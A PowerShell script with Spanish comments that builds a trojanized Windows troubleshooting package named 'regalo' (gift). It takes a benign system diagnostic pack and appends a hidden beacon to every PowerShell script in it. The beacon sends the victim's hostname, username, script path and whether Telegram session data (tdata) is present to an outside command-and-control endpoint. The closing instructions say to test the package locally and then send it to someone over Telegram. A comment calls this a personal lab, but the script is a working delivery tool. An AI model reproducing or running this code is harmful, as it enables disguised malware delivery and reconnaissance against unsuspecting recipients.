# ARMAR-GIFT.ps1 — construye el regalo.diagpkg instrumentado (pack benigno del sistema + beacon)
# Lab propio. El beacon solo avisa que el pack ejecuto: no roba archivos.
$ErrorActionPreference = 'Stop'

$C2 = 'https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon'

# 1) elegir un pack del sistema (benigno)
$src = 'C:\Windows\diagnostics\system\Audio'
if (-not (Test-Path $src)) {
  $cand = Get-ChildItem 'C:\Windows\diagnostics\system' -Directory | Select-Object -First 1
  if (-not $cand) { Write-Host 'NO HAY PACKS EN C:\Windows\diagnostics\system'; exit 1 }
  $src = $cand.FullName
}
Write-Host "pack base: $src"

# 2) copia de trabajo
$work = Join-Path $env:TEMP ('giftpack_' + (Get-Date -Format 'HHmmss'))
Copy-Item $src $work -Recurse -Force

# 3) inyectar el beacon al final de cada script .ps1 del pack
# payload inteligente de dos etapas:
#  H2-OPEN : apenas msdt abre el pack (el 1-click quedo confirmado)
#  H2-EXEC : detalles + ruta del script corriendo. Si la ruta contiene
#            Downloads\Telegram Desktop, se ejecuto la copia AUTO-DESCARGADA
#            (campo auto=SI) = cadena completa demostrada de punta a punta.
$beacon = 'try{$p=if($PSCommandPath){$PSCommandPath}else{$PWD.Path};$b=@{marker="H2-OPEN";ua="msdt-troubleshooting-pack";extra="host=$env:COMPUTERNAME|user=$env:USERNAME|ruta=$p"}|ConvertTo-Json -Compress;Invoke-RestMethod -Method Post -Uri "' + $C2 + '" -ContentType "application/json" -Body $b}catch{}' + "`r`n" +
           'try{$p=if($PSCommandPath){$PSCommandPath}else{$PWD.Path};$auto=if($p -like "*Downloads\Telegram Desktop*"){"SI"}else{"NO"};$b=@{marker="H2-EXEC";ua="msdt-troubleshooting-pack";extra="host=$env:COMPUTERNAME|user=$env:USERNAME|tdata=" + (Test-Path "$env:APPDATA\Telegram Desktop\tdata") + "|auto=$auto|ruta=$p"}|ConvertTo-Json -Compress;Invoke-RestMethod -Method Post -Uri "' + $C2 + '" -ContentType "application/json" -Body $b}catch{}'
$ps1s = Get-ChildItem $work -Recurse -Filter *.ps1
foreach ($f in $ps1s) {
  Add-Content -Path $f.FullName -Value "`r`n# diagnostica`r`n$beacon" -Encoding UTF8
}
Write-Host ("beacon inyectado en {0} scripts" -f $ps1s.Count)

# 4) salida al escritorio
$out = [Environment]::GetFolderPath('Desktop')
$folder = Join-Path $out 'regalo-carpeta'
Copy-Item $work $folder -Recurse -Force

# 5) empaquetar a .diagpkg (cab con estructura relativa preservada)
$ddf = Join-Path $env:TEMP 'gift.ddf'
$rel = @()
$lines = @()
$lines += '.OPTION EXPLICIT'
$lines += '.Set CabinetName1=regalo.diagpkg'
$lines += ('.Set DiskDirectory1="' + $out + '"')
$lines += '.Set CompressionType=LZX'
$files = Get-ChildItem $work -Recurse -File
foreach ($f in $files) {
  $r = [IO.Path]::GetRelativePath($work, $f.FullName)
  $lines += ('"' + $f.FullName + '" "' + $r + '"')
}
Set-Content -Path $ddf -Value ($lines -join "`r`n")
& makecab.exe /F $ddf | Out-Null
$diag = Join-Path $out 'regalo.diagpkg'
if (Test-Path $diag) { Write-Host "GENERADO: $diag ($((Get-Item $diag).Length) bytes)" }
else { Write-Host 'makecab fallo: proba primero la variante carpeta (regalo-carpeta)'; exit 1 }

# 6) lanzador local de prueba
$cmd = Join-Path $out 'abrir-regalo.cmd'
'msdt.exe -path "%USERPROFILE%\Desktop\regalo-carpeta"' | Set-Content -Path $cmd -Encoding ASCII
Write-Host "GENERADO: $cmd"
Write-Host ''
Write-Host 'PROBAR PRIMERO EN LOCAL (abrir-regalo.cmd). Si la consola muestra H2-OPEN y despues H2-EXEC, recien ahi mandar el regalo por Telegram. En H2-EXEC, auto=SI significa que se ejecuto la copia auto-descargada: cadena completa demostrada.'
